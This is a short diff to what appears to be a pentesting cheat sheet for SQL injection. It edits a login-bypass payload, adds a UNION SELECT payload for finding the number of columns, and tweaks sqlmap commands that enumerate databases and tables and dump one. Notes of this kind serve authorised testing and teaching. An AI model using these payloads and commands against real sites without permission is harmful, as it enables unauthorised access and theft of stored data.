@@ -93,7 +93,10 @@ Note: The last dash protects the trailing space, which can get removed otherwise
 `value' -- -`
 
 Circumvent Query Condition
-`' OR 1=1;--`
+`' or 1=1;-- -`
+
+Determine Number of Columns in Select (add/remove numbers until no error)
+`value' union select 1,2,3-- -`
 
 ## sqlmap
 
@@ -112,7 +115,7 @@ Enumerate databases
 `sqlmap -r request.req --batch --dbs`
 
 Get table names from dbname database
-`sqlmap -r request.req -D dbname --tables`
+`sqlmap -r request.req --batch -D dbname --tables`
 
 Dump the tblname table
 `sqlmap -r request.req -D dbname -T tblname --dump`
